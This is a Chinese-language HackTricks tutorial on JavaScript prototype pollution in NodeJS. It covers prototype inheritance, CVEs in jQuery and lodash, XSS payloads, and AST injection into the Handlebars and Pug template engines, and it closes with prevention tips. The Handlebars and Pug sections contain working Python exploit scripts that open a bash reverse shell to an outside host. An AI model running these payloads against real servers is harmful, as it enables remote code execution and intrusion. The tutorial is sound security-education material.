# NodeJS - \_\_proto\_\_ & 原型污染

<details>

<summary><strong>从零开始学习AWS黑客技术直到成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## JavaScript中的对象 <a href="#053a" id="053a"></a>

首先，我们需要理解JavaScript中的`Object`。对象只是键和值对的集合，通常称为该对象的属性。例如：

![](<../../../.gitbook/assets/image (389) (1).png>)

在Javascript中，`Object`是一个基本对象，是所有新创建对象的模板。通过向`Object.create`传递`null`可以创建一个空对象。然而，新创建的对象也会有一个对应传递参数的类型，并继承所有基本属性。
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

之前我们了解到，javascript 中的对象是键和值的集合，因此一个 `null` 对象只是一个空字典：`{}`

## Javascript 中的函数/类 <a href="#55dd" id="55dd"></a>

在 Javascript 中，类和函数的概念是相当相关的（函数本身充当类的构造器，而实际上 javascript 没有“类”的概念）。让我们看以下示例：
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript 中的原型 <a href="#3843" id="3843"></a>

需要注意的一点是，执行代码时可以更改/修改/删除原型属性。例如，可以动态地向类添加函数：

![](<../../../.gitbook/assets/image (363).png>)

类的函数也可以被修改（如下例中的 `toString` 或 `valueOf`）：

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## 继承

在基于原型的程序中，对象从类继承属性/方法。通过向另一个类的实例添加属性/方法或向空对象添加属性/方法来派生类。

请注意，如果您向用作一组对象原型的对象（如 myPersonObj）添加属性，则该原型的对象也会获得新属性，但除非特别调用，否则不会打印该属性。

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ 污染 <a href="#0d0a" id="0d0a"></a>

您应该已经了解到**JavaScript 中的每个对象都仅仅是键和值对的集合**，并且**每个对象都继承自 JavaScript 中的 Object 类型**。这意味着，如果您能够污染 Object 类型，**环境中的每个 JavaScript 对象都将被污染！**

这相当简单，您只需要能够修改任意 JavaScript 对象的一些属性（键值对），因为每个对象都继承自 Object，每个对象都可以访问 Object 方案。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
从前面的例子中，可以通过以下方式访问Object的结构：
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
因此，如前所述，如果现在向Object方案添加了一个属性，那么每个JavaScript对象都将能夠访问新属性：
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
## 原型污染

这种技术并不像前一种技术那样有效，因为你不能污染JS对象的结构。但在**关键字`__proto__`被禁止的情况下，这种技术可能会有用**。

如果你能够修改函数的属性，你可以修改函数的`prototype`属性，**你在这里添加的每个新属性都会被该函数创建的每个对象继承：**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
在这种情况下，只有从`person`类创建的**对象**会受到影响，但它们现在将**继承属性`sayHello`和`newConstant`**。

**有2种方法可以通过原型污染来污染每一个JS对象。**

第一种方法是污染**Object**的prototype属性（如前所述，每个JS对象都继承自这个）：
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
如果您能够做到这一点，每个JS对象都将能够执行函数`sayBye`。

另一种方式是像下面的例子一样，对字典变量的构造器原型进行污染：
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
执行该代码后，**每个JS对象都将能够执行函数`sayHey`**。

## 污染其他对象

### 从一个类到Object.prototype

在一个你可以**污染特定对象**并且需要**到达`Object.prototype`**的场景中，你可以使用类似以下代码来搜索它：
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### 数组元素污染

请注意，就像您可以在JS中污染对象的属性一样，如果您可以污染数组，您也可以**污染通过索引**访问的数组的**值**（请注意，您不能覆盖值，因此您需要污染那些以某种方式被使用但未被写入的索引）。
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html 元素污染

通过 JS 生成 HTML 元素时，可以**覆盖** **`innerHTML`** 属性，使其编写**任意 HTML 代码。** [灵感和示例来自这篇文章](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## 示例

### 基础示例

那么原型污染在哪里发生呢？当应用程序中存在一个错误，使得可以重写`Object.prototype`的属性时，就会发生原型污染。由于每个典型对象都从`Object.prototype`继承其属性，我们可以改变应用程序的行为。最常见的示例是以下情况：
```javascript
if (user.isAdmin) {   // do something important!}
```
想象我们有一个原型污染，可以设置 `Object.prototype.isAdmin = true`。那么，除非应用程序明确分配了任何值，否则 `user.isAdmin` 总是为真！

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

例如，`obj[a][b] = value`。如果攻击者可以控制 `a` 和 `value` 的值，那么他只需要将 `a` 的值调整为 `__proto__`（在javascript中，`obj["__proto__"]` 和 `obj.__proto__` 是完全等价的），然后应用程序中所有现有对象的属性 `b` 将被分配给 `value`。

然而，攻击并不像上面那样简单，根据[论文](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)，我们只能在满足以下三个条件之一时进行攻击：

* 执行递归合并
* 通过路径定义属性
* 克隆对象

### 覆盖函数
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### 原型污染到远程代码执行

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## 客户端原型污染到XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358：通过jQuery $ .extend进行的原型污染攻击

如果处理不当，$ .extend可以改变对象`prototype`（应用中对象的模板）的属性。这个属性随后会出现在所有对象上。注意，只有“深度”版本（即g）的$ .extend受到影响。

程序员经常使用这个函数来复制一个对象或从默认对象填充新属性。例如：

我们可以想象`myObject`是用户的输入字段，并被序列化到数据库中）

在这段代码中，我们通常认为，运行时会将属性`isAdmin`分配到新创建的对象中。但实际上，它是直接分配给`{}`的，然后`{}.isAdmin`将会是`true`。如果在这段代码之后，我们执行以下检查：
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
如果用户尚不存在（`undefined`），则会在其父对象中搜索属性`isAdmin`，即上面添加了值为`true`的`isAdmin`的Object。

在JQuery 3.3.1上执行时的另一个例子：
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
这些错误可能会影响许多JavaScript项目，尤其是NodeJS项目，最实际的例子是2018年12月Mongoose中的错误，Mongoose是一个帮助操作MongoDB的JS库。

### CVE-2018–3721, CVE-2019–10744：通过lodash进行原型污染攻击

[Lodash](https://www.npmjs.com/package/lodash) 也是一个著名的库，提供了许多不同的功能，帮助我们更方便、更整洁地编写代码，每周下载量超过1900万次。它和JQuery有着同样的问题。

**CVE-2018–3721**

**CVE-2019–10744**

这个漏洞影响了Lodash的所有版本，已在4.17.11版本中修复。

### 另一个带有CVEs的教程

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## AST原型污染

在NodeJS中，AST在JS中非常常用，如模板引擎和typescript等。\
对于模板引擎，结构如上图所示。

![img](https://blog.p6.is/img/2020/08/graph_3.jpg)

### Handlebars

信息取自[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

您可以将任何字符串插入`Object.prototype.pendingContent`来确定攻击的可能性。\
这允许您确信，在黑盒环境中存在原型污染时，服务器正在使用handlebars引擎。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
**利用**

![img](https://blog.p6.is/img/2020/08/graph_5.jpg)

Handlebars 的工作流程如上图所示。

在词法分析器和解析器生成 AST 之后，它会传递给 `compiler.js`\
我们可以使用一些参数运行模板函数编译器生成的内容。它会返回类似于 “Hello posix” 的字符串（当 msg 是 posix 时）。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
解析器在 handlebars 中强制类型为 NumberLiteral 的节点的值始终通过 Number 构造函数是一个数字。然而，您可以使用原型污染在此处插入一个非数字字符串。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
首先，查看 compile 函数，它支持两种输入方式，AST 对象和模板字符串。

当 input.type 是 `Program` 时，尽管输入值实际上是字符串。\
解析器认为它已经是由 parser.js 解析的 AST，并将其发送给编译器，而不进行任何处理。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
编译器接收到 AST 对象（实际上是一个字符串），将其发送到 `accept` 方法。\
`accept` 调用编译器的 `this[node.type]`。\
然后取 AST 的 body 属性，用于构建函数。
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
因此，攻击可以这样配置。如果您已经检查了解析器，请指定一个不能赋给NumberLiteral值的字符串。但是一旦处理了注入的AST，我们可以将任何代码插入到函数中。

**示例**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

更多信息请见 [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## 如何预防？

* 使用 Object.freeze 冻结属性（Object.prototype）
* 根据应用程序的模式对 JSON 输入进行验证
* 避免不安全地使用递归合并函数
* 使用没有原型属性的对象，例如 `Object.create(null)`，以避免影响原型链
* 使用 `Map` 而不是 `Object`
* 定期为库更新新补丁

## 参考资料

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧。

</details>
